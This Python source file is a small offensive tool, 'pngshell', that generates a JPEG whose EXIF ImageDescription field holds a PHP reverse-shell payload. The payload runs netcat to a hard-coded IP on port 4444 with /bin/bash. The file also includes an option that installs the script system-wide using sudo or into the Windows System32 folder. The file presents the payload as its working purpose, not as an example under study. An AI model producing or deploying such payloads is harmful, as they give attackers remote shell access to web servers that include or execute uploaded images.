import os
import sys
import argparse
from PIL import Image
import piexif
import platform
banner = """
██████╗ ███╗   ██╗ ██████╗  
██╔══██╗████╗  ██║██╔════╝  
██████╔╝██╔██╗ ██║██║  ███╗ 
██╔═══╝ ██║╚██╗██║██║   ██║ 
██║     ██║ ╚████║╚██████╔╝ 
╚═╝     ╚═╝  ╚═══╝ ╚═════╝  
██████╗ ██╗    ██╗███╗   ██╗
██╔══██╗██║    ██║████╗  ██║
██████╔╝██║ █╗ ██║██╔██╗ ██║
██╔═══╝ ██║███╗██║██║╚██╗██║
██║     ╚███╔███╔╝██║ ╚████║
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
"""
def create_image():
    image = Image.new('RGB', (200, 200), 'white')
    exif_dict = {
        "0th": {
            piexif.ImageIFD.ImageDescription: "<?php system('nc 192.168.31.41 4444 -e /bin/bash'); __halt_compiler(); ?>"
        },
        "Exif": {},
        "GPS": {},
        "1st": {}
    }
    exif_bytes = piexif.dump(exif_dict)
    image.save("Exif.jpg", exif=exif_bytes)
    print("[+] Image generated successfully with reverse shell payload.")
    print("\nMade by Clumsy Version 1.0")
def install():
    if platform.system() == 'Windows':
        os.system('copy pngshell.py C:\\Windows\\System32\\pngshell.py')
    else:
        os.system('sudo cp pngshell.py /usr/local/bin/pngshell')
        os.system('sudo chmod +x /usr/local/bin/pngshell')
def help_menu():
    print(banner)
    print("Usage: pngshell [options]")
    print("\nOptions:")
    print("  -h, --help            Show this help message")
    print("  -i, --install         Install pngshell system-wide")
    print("  -c, --create          Create an image with a reverse shell payload")
def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    parser.add_argument('-i', '--install', action='store_true', help='Install pngshell system-wide')
    parser.add_argument('-c', '--create', action='store_true', help='Create reverse shell image')
    args = parser.parse_args()
    if args.help:
        help_menu()
        sys.exit(0)
    elif args.install:
        install()
        print("[+] pngshell installed successfully.")
        sys.exit(0)
    elif args.create:
        create_image()
        sys.exit(0)
    else:
        help_menu()
        sys.exit(1)
if __name__ == '__main__':
    main()
